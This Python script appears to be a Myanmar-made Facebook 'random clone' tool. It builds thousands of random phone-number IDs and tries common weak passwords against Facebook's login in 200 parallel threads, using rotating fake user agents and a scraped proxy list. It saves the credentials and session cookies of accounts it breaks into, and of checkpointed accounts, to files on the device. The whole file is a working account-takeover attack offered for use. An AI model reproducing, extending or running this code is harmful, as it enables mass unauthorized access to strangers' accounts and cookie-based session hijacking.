import random, requests , re , sys , os , time
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
twf =[]
ses=requests.Session()
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
ugen=[]
ugen = []
#Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/166.0.0.53.95;FBBV/101310068;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Mobilis;FBID/phone;FBLC/fr_FR;FBOP/45;FBRV/0]
#Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36 Edg/123.0.0.0
for xd in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['8.0.0','9.0.0', '10.0.0', '11.0.0', '12.0.0'])
    j='SM-G955U Build/R16NW'
    c='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    d=random.randrange(20, 999)
    e='0.0.0'
    f=random.randrange(2000, 6000)
    g=random.randrange(20, 200)
    h='Mobile Safari/537.36'
    ua=f'{a} {b}; {j}) {c}{d}.{e} {h}'
    ugen.append(ua)
A = '\x1b[1;97m' 
B = '\033[1;32m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

def main():
    os.system('clear')
    print(logo)
    print("\033[38;5;43m  \033[1;32m[\033[1;97m1\033[1;32m] \033[1;97mSTART UID CLONE")
    print("\033[38;5;43m  \033[1;32m[\033[1;97m0\033[1;32m] \033[1;91mEXIT TOOL ")
    ZWE = input(f'\033[1;32m  [\033[1;97m?\033[1;32m] \033[1;97mSELECT \033[38;5;41m~~~~~~~\033[1;32m ')
    if ZWE in ["1","01"]:
        phone()
    if ZWE in ["0","X"]:        
        os.system('exit')
def phone():
    user=[]
    os.system('clear')
    print(logo)
    print("\033[38;5;43m \033[1;32m [\033[1;97m✔\033[1;32m]\033[1;97m EXAMPLE \033[38;5;41m ━━ \033[1;32m[\033[1;97m777\033[1;32m] / [\033[1;97m444\033[1;32m] / [\033[1;97m666\033[1;32m] / [\033[1;97m999\033[1;32m] / [\033[1;97metc..\033[1;32m] ")
    code = input('\033[1;32m  [\033[1;97m?\033[1;32m]\033[1;97m INPUT YOUR CODE \033[38;5;41m~\033[1;32m ')
    os.system('clear')
    print(logo)
    print("\033[38;5;43m  \033[1;32m[\033[1;97m✔\033[1;32m] \033[1;97mEXAMPLE \033[38;5;41m ~ \033[1;32m[\033[1;97m3000\033[1;32m] / [\033[1;97m5000\033[1;32m] / [\033[1;97m10000\033[1;32m] / [\033[1;97metc..\033[1;32m] ")
    limit=int(input("\033[1;32m  [\033[1;32m?\033[1;32m]\033[1;97m INPUT YOUR LIMIT \033[38;5;41m ~ \033[1;32m "))    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=200) as LEE:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f'\033[1;32m\033[38;5;43m [\033[1;91m•\033[1;32m]\033[1;97m TOTAL ID        \033[38;5;41m ~    \033[1;32m'+tl+'                  \033[38;5;43m')
        print(f'\033[1;32m\033[38;5;43m [\033[1;91m•\033[1;32m]\033[1;97m CHOICE CODE     \033[38;5;41m ~    \033[1;32m'+code+'                    \033[38;5;43m')
        print(f"\033[1;32m\033[38;5;43m [\033[1;91m•\033[1;32m] \033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!          \033[38;5;43m")
        linex()
        for love in user:
            uid = '09'+code+love
            pwx = [love,code+love,code+love[:4],love[1:],'myanmar','myanmar123','Myanmar123','Myanmar','kyawkyaw','zawzaw','aungaung','chitchit','htethtet']
            LEE.submit(rcrack,uid,pwx,tl)

def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            session = requests.Session()
            pro = random.choice(ugen)
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;91m[\033[1;92mSEARCHING\033[1;91m]⏳[\033[1;92m%s\033[1;91m]⌛[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            headers = {
            'authority': 'www.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'dpr': '1.5',
            'origin': 'https://www.facebook.com',
            'referer': 'https://www.facebook.com/?_rdr',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.130", "Microsoft Edge";v="120.0.2210.91"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"15.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,
            'viewport-width': '677',}
            lo = session.post('https://www.facebook.com/login/',headers=headers, data=data).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                print(f"\033[1;32m  [✔] {uid} ━━ {ps}" '  \n\033[1;97m[COOKIE] ━━ \033[1;97m'+coki+  '')
                open('/sdcard/TMS1-OK.txt', 'a').write( uid+' | '+ps+'\nCookie = '+coki+'\n\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:            	
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[96:111]
                print(f"\x1b[1;93m  [✖] {uid} ━━ {ps}")
                open('/sdcard/TMS1-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break            
            else:
                continue
        loop+=1
        
    except:
        pass
        

logo = ("""
\033[97m          ████████╗███╗   ███╗███████╗
\033[97m          ╚══██╔══╝████╗ ████║██╔════╝
\033[97m             ██║   ██╔████╔██║███████╗
\033[97m             ██║   ██║╚██╔╝██║╚════██║
\033[97m             ██║   ██║ ╚═╝ ██║███████║
\033[34m             ╚═╝   ╚═╝     ╚═╝╚══════╝     \x1b[38;5;45mPRO
                            
\033[1;33;40m  🤎━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🤎
  \033[1;33;40m<|> \033[1;32mDEVELOPER    \033[38;5;41m~~~ \033[1;32mTHEIN HTET ZAW
  \033[1;33;40m<|> \033[1;32mTOOL STATUS  \033[38;5;41m~~~ \033[1;32mRANDOM CLONE
  \033[1;33;40m<|> \033[1;32mTOOL VERSION \033[38;5;41m~~~ \033[1;32m00.02
\033[1;33;40m  🤎━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🤎""")
def linex():
	print(f'\033[1;32m  🤎━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🤎')

main()
